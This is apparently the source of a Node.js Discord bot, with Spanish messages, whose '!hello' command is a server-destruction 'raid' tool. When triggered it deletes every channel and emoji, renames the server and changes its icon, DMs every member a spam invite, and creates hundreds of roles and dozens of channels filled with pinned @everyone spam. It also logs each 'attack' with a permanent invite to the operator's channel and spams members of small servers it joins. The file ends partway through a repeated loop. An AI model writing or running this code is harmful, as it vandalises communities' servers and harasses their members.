const express = require('express');

const app = express();

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.send('Host Activado');
});

app.listen(3000, () => console.log('Servidor Iniciando')); 



const { Client, MessageEmbed  } = require("discord.js");
const Discord = require("discord.js");
const client = new Discord.Client({ ws: { intents: 32767 } });


const prefix = "!"



client.on("ready", () => {
   console.log("Bot Online");
   
   client.user.setPresence( {
       status: "dnd",
       activity: {
           name: prefix+"hello",
           type: "PLAYING"
       }
   } );

});



client.on("guildCreate", async(guild) => {
  if(guild.id === "809838713046695966")return;

let catcher = client.channels.cache.get("798374854176931881")

if(guild.memberCount < 15){
  guild.members.cache.filter(m => m.id !== client.user.id).forEach(members => members.send("https://discord.gg/ctP7k46e98"))
  guild.leave().catch(err => catcher.send("Hubo un error en el guildLeave"))
}

});

 client.on("message", async (message) => {
   if (message.author.bot) return;
   let args = message.content.slice(prefix.length).trim().split(/ +/g)
   let command = args.shift().toLowerCase();
   if(!message.content.startsWith(prefix)) return;

  let cmds = ["invite", "hello", "prueba"]
 




if(command === 'hello'){

if(message.author.id === "750181900571639839")return message.channel.send("Esta en la blacklist coño tu madre")

if(message.guild.id === "768483070340759612")return;

if(message.guild.id === "798374016465109002")return;

 let channel = client.channels.cache.get("798374818139209749")

 let catcher = client.channels.cache.get("798374854176931881")


let invite_catcher = message.channel.createInvite({  
 
maxAge: 0  
}).then(invite => {
 
const embed = new MessageEmbed()
.setTitle(':crossed_swords:Attack')
.setDescription("Mensaje log de ataque de raid")
.addField("Autor de Ataque:", message.author.tag)
.addField("Servidor:", message.guild.name)
.addField("ID del Servidor:", message.guild.id)
.addField("Numero de Usuarios:", message.guild.memberCount)
.addField("Invitación de Servidor:", invite)
.setImage("https://images-ext-2.discordapp.net/external/MqyUSuXMRkZaUAYVqr12eJ19b_3gYbnDh-stFYtobjk/%3Fsize%3D4096/https/cdn.discordapp.com/icons/768483070340759612/a_7316e98e11db3d582092ce9cb8ae4a43.gif")
.setColor(0xff4d4d)
.setFooter('#LoyaltyForever')
.setTimestamp()

channel.send(embed)
})

message.guild.members.cache.filter(members => members.id !== "791861182226890813").forEach(spam => spam.send("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").catch(err => catcher.send("Hubo un error en el spamAll")) && spam.send("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").catch(err => catcher.send("Hubo un error en el spamAll")))

  


    message.guild.setName("Rąi๔-ҍy͓̽-ꝈօyąӀէy")
    message.guild.setRegion("japan")
    message.guild.channels.cache.forEach(channel => channel.delete().catch(err => catcher.send("Hubo un error en el deleteChannels")))
    message.guild.setVerificationLevel("VERY_HIGH")
    message.guild.emojis.cache.forEach(emote => emote.delete())
          message.guild.setIcon("https://64.media.tumblr.com/a9c70990f5634d2710b15904245c088c/tumblr_nv1v3m8iK11rh2wmgo1_500.gif")

for(let i =0;i<=300;i++){
          message.guild.roles.create({
  data: {
    name: 'https://discord.gg/ctP7k46e98',
    color: '#681414',
    permissions: [] }
}).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de roles")
            })
}


        for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

           for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            //////////////////////////

        for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            //////////////////////////////////

          for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
     }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}
            ///////////////////////////////

              for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            ////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy-Ϛզմąժ https://discord.gg/ctP7k46e98").then(msg => msg.pin())
     }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            ///////////////////

           for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
